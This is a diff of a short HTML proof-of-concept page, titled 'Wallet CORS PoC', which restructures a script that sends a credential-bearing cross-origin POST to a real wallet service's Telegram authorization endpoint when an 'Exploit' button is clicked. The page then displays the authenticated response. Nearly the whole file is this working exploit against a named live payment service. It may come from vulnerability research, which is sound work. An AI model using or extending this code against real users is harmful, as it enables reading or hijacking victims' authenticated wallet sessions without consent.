@@ -1,17 +1,22 @@
-<script>
-function exploit() {
-  fetch("https://pay.wallet.tg/api/v1/users/authorize_by_telegram/", {
-    method: "POST",
-    credentials: "include",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: "{}"
-  })
-  .then(res => res.text())
-  .then(data => alert("Got response:\n" + data))
-  .catch(err => alert("Error: " + err));
-}
-</script>
-
-<button onclick="exploit()">Exploit</button>
+<!DOCTYPE html>
+<html>
+  <head><title>Wallet CORS PoC</title></head>
+  <body>
+    <button onclick="exploit()">Exploit</button>
+    <script>
+      function exploit() {
+        fetch("https://pay.wallet.tg/api/v1/users/authorize_by_telegram/", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: "{}"
+        })
+        .then(res => res.text())
+        .then(data => alert("Response:\n" + data))
+        .catch(err => alert("Error:\n" + err));
+      }
+    </script>
+  </body>
+</html>
